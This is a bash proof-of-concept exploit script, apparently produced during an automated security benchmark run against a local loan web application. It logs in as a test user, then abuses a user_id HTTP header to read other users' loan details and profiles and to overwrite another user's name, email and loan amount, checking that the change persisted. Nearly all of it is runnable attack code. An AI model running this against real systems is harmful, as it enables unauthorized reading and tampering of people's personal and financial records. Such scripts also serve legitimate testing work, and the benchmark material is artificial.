#!/bin/bash
# POC: Simplified IDOR via user_id header POC testing unauthorized access to loan details and profile modification
# Target: ./repo
# Created: 2025-12-01T16:22:13.305Z
# Session: benchmark-XBEN-104-24-minci3mm

# IDOR via user_id HTTP Header - Loan Details and Profile Access/Modification POC
# Simplified version with direct cookie handling

TARGET_URL="${1:-http://localhost:8080}"
VICTIM_USER_ID="2"
ANOTHER_VICTIM_ID="4"

echo "[*] IDOR via user_id HTTP Header - POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Login with test:test credentials and capture session
echo "[*] Step 1: Authenticating as test:test"
curl -s -c /tmp/cookies.txt \
  -X POST "$TARGET_URL/login" \
  -d "username=test&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  > /dev/null 2>&1

sleep 1

# Verify we have a cookie
if [ ! -f /tmp/cookies.txt ] || ! grep -q "session" /tmp/cookies.txt; then
  echo "[-] Failed to obtain session cookie"
  exit 1
fi

echo "[+] Authentication successful"
echo ""

# Step 2: Test READ IDOR on /loan_details endpoint
echo "[*] Step 2: Testing READ IDOR on /loan_details with user_id: $VICTIM_USER_ID"
echo ""

LOAN_RESPONSE=$(curl -s -b /tmp/cookies.txt \
  -H "user_id: $VICTIM_USER_ID" \
  "$TARGET_URL/loan_details" 2>&1)

echo "[*] Response:"
echo "$LOAN_RESPONSE"
echo ""

# Check for success indicators
if echo "$LOAN_RESPONSE" | grep -qE "principal|Principal|loan|Loan" && ! echo "$LOAN_RESPONSE" | grep -qiE "error|forbidden|unauthorized|404"; then
  echo "[+] IDOR READ on /loan_details: CONFIRMED"
else
  echo "[-] Could not confirm READ IDOR"
fi

echo ""

# Step 3: Test Profile Read with user_id header
echo "[*] Step 3: Testing Profile READ with user_id: $ANOTHER_VICTIM_ID"
echo ""

PROFILE_GET=$(curl -s -b /tmp/cookies.txt \
  -H "user_id: $ANOTHER_VICTIM_ID" \
  "$TARGET_URL/profile" 2>&1)

echo "[*] Response (first 500 chars):"
echo "$PROFILE_GET" | head -c 500
echo ""
echo ""

if echo "$PROFILE_GET" | grep -qE "name|email|loan" && ! echo "$PROFILE_GET" | grep -qiE "error|forbidden|unauthorized"; then
  echo "[+] Profile READ via header: CONFIRMED"
fi

echo ""

# Step 4: Test WRITE IDOR - Modify profile via header
echo "[*] Step 4: Testing WRITE IDOR on /profile with user_id: $ANOTHER_VICTIM_ID"
echo "[*] Modifying profile with: name=HACKED_BY_IDOR&email=hacked@test.com&loan_amount=77777"
echo ""

MODIFY=$(curl -s -b /tmp/cookies.txt \
  -X POST \
  -H "user_id: $ANOTHER_VICTIM_ID" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  "$TARGET_URL/profile" \
  -d "name=HACKED_BY_IDOR&email=hacked@test.com&loan_amount=77777" 2>&1)

echo "[*] Modification response:"
echo "$MODIFY"
echo ""

# Step 5: Verify the modification persisted
echo "[*] Step 5: Verifying modification persisted by reading profile again"
echo ""

VERIFY=$(curl -s -b /tmp/cookies.txt \
  -H "user_id: $ANOTHER_VICTIM_ID" \
  "$TARGET_URL/profile" 2>&1)

echo "[*] Verification response:"
echo "$VERIFY" | head -c 500
echo ""

if echo "$VERIFY" | grep -q "HACKED_BY_IDOR"; then
  echo "[+] WRITE IDOR: CONFIRMED - Modification persisted"
else
  echo "[-] Could not confirm modification persisted"
fi

echo ""
echo "[*] POC Complete"

# Cleanup
rm -f /tmp/cookies.txt